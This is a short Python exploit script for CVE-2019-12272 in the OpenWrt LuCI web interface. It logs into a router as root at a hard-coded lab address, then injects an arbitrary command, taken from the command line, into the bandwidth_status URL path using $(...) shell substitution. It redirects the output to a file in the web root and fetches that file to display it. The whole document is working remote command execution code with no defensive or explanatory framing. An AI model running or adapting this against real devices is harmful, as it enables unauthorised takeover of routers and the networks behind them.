import requests
from urllib.parse import urlparse
import sys

from requests.models import Response

class CVE_2019_12272:

    def __init__(self):
        self.host = '192.168.56.3'
        self.uname = 'root'
        self.upass = '******'
        self.stok = ''
        self.cmd = ''
        self.cookies = ''
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'http://{host}/cgi-bin/luci',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }


    def login(self):
        data = {
            'luci_username': '{uname}'.format(uname=self.uname),
            'luci_password': '{upass}'.format(upass=self.upass)
        }
        response = requests.post('http://{host}/cgi-bin/luci'.format(host=self.host), headers=self.headers, cookies=self.cookies, data=data, allow_redirects=False)
        location = response.headers['Location']
        self.stok = urlparse(location).params
        self.cookies = response.cookies

    def shell(self, cmd):
        url = 'http://{host}/cgi-bin/luci/;{stok}/admin/status/realtime/bandwidth_status/eth0$({cmd}%3ecmd.txt)'.format(host=self.host, stok=self.stok, cmd=cmd)
        response = requests.get(url, headers=self.headers, cookies=self.cookies)

    def view(self):
        url = 'http://{host}/cmd.txt'.format(host=self.host)
        response = requests.get(url, headers=self.headers)
        print(response.text)

if __name__ == "__main__":
    exp = CVE_2019_12272()
    exp.login()
    exp.shell(sys.argv[1])
    exp.view()